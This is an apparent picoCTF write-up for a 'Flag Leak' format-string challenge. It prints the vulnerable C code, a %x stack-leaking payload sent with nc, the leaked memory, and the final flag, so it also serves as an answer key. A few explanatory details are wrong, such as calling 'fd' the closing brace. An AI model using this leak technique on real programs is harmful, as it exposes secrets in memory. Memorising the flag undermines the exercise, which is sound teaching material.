# Flag Leak - 300 pts

### Key points

- Format strings

---

## **Contents**

- [Overview](#overview)
- [Solution](#solution)
- [Flag](#the-flag)

---

## Overview

### Description

> I'm just copying and pasting with this program. What can go wrong? You can view source here. And connect with it using:

```
$ nc saturn.picoctf.net 64529
Tell me a story and then I'll tell you one >> picopicopico
Here's a story -
picopicopico
```

---

## Solution

Here's the source code for the `vuln()` function:

```
void vuln(){
   char flag[BUFSIZE];
   char story[128];

   readflag(flag, FLAGSIZE);

   printf("Tell me a story and then I'll tell you one >> ");
   scanf("%127s", story);
   printf("Here's a story - \n");
   printf(story);
   printf("\n");
}
```

The program reads a user input and simply prints it back out, but using [`printf()`](https://documentation.help/C-Cpp-Reference/printf.html). This is vulnerable to a format string exploit.

An example of a proper use of `printf()` is:

```
printf("This is the flag: %s", "picoCTF{n0p3}");
>>> This is the flag: picoCTF{n0p3}
```

Basically, `printf()` substitutes format flags (indicated by a `%` sign) in a base string with the corresponding arguments. Here, `printf()` is not supplied any arguments; it only prints our output. What if we put format flags in our input?

When more arguments than format flags are provided, `printf()` may start reading or even writing to the stack.

Let's enter a payload of a bunch of `%x` format flags to leak the stack in hexadecimal.

```
$ nc saturn.picoctf.net 64529
Tell me a story and then I'll tell you one >> %x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x
Here's a story -
ff816660ff8166808049346782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578252578256f6369707b4654436b34334c5f676e3167346c466666305f3474535f635f6b63343965327d643365fbad2000a16231000f7fd8990804c00080494100804c000ff81674880494182ff8167f4ff8168000ff81676000f7dceee5
```

`6f636970` is `pico` in hex (little endian), and `fd` is our closing brace `'}'`. Make sure to include 3 characters after `7d` because of endianness. Let's grab that chunk and convert it:

```
6f6369707b4654436b34334c5f676e3167346c466666305f3474535f635f6b63343965327d643365
```

---

## Flag:

> `picoCTF{l34k1ng_Fl4g_0ff_St4ck_c2e94e3d}`
